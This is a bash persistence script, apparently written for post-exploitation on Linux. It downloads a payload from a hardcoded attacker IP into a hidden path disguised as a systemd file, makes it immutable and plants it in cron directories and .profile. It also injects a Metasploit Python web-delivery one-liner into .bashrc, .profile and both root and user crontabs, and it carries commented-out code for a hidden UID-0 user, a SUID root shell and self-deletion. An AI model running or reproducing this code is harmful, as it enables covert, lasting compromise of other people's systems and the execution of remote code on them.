#! /bin/bash
# temp
# Uncomment Self delete at the end
if  [ $UID -ne 0 ]
then
    echo "[ERROR] You must run this script as root!"
    exit
fi

TMP="/tmp/.systemd-private-7fb02b9952684e7ca181d0fbcef23578-systemd-logind.service-PDdiyg" # Generic path to store payload
HIP=192.168.211.129 # Host server IP (python)
HP=8000 # Host Port (python)
P="Downloads/xxx" # Host directory payload (python)
WEBP="\"import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.211.129:8080/sb', context=ssl._create_unverified_context());exec(r.read());\"" # part of the metasploit python web delivery payload

wget=/usr/bin/wget
curl=/usr/bin/curl
python=/usr/bin/python
python3=/usr/bin/python3

# Root
#sudo useradd -ou 0 -g 0 systemctl
#echo -e "linuxpassword\nlinuxpassword" | sudo passwd systemctl # disable if shell is'nt interactive

# SUID (swisskey)
# TMPDIR2="/var/tmp"
# echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/system.c
# gcc $TMPDIR2/system.c -o $TMPDIR2/system 2>/dev/null
# rm $TMPDIR2/system.c
# chown root:root $TMPDIR2/system
# chmod 4777 $TMPDIR2/system


[ ! -d $TMP ] && mkdir $TMP
if [ -x "$curl" ]; then
	curl "http://"$HIP:$HP/$P -o /$TMP/.dbus
elif [ -x "$wget" ]; then
	wget $HIP:$HP/$P
	[ -f ./xxx ] && mv xxx /$TMP/.dbus || echo "wget fail" #Give xxx a variable
else
	echo "No file downloaders"
	echo "Payload based persistence may not work"
fi

# Make executable
sudo chmod +x /$TMP/.dbus # ".dbus" probably needs it's own variable
# Make immutable
sudo chattr +i /$TMP/.dbus

# Cron
[ -d /etc/cron.hourly ] && cp /$TMP/.dbus /etc/cron.hourly
[ -d /etc/cron.daily ] && cp /$TMP/.dbus /etc/cron.daily
[ -d /etc/cron.weekly ] && cp /$TMP/.dbus /etc/cron.weekly

# .profile
echo "nohup $TMP/.dbus &>/dev/null &" >> ~/.profile

# Python based
# .bashrc
if [ -x "$python" ]; then
	echo "python -c $WEBP" >> ~/.bashrc
	echo "python -c $WEBP" >> ~/.profile
	sudo echo "*/30 * * * * root python -c $WEBP" >> /etc/crontab  #root cron
	sudo echo "*/14 * * * * python -c $WEBP" > file; crontab file; rm file #user cron (every */<min>) # fix this
elif [ -x "$python3" ]; then
	echo "python3 -c $WEBP" >> ~/.bashrc
	echo "python3 -c $WEBP" >> ~/.profile
	sudo echo "*/30 * * * * root python3 -c $WEBP" >> /etc/crontab #root cron 
	sudo echo "*/14 * * * * python3 -c $WEBP" > file1; crontab file1; rm file1 #user cron (every */<min>) # fix this
else
	echo "No Python :("
fi


# Self Delete
#rm -- "$0" #only uncomment when active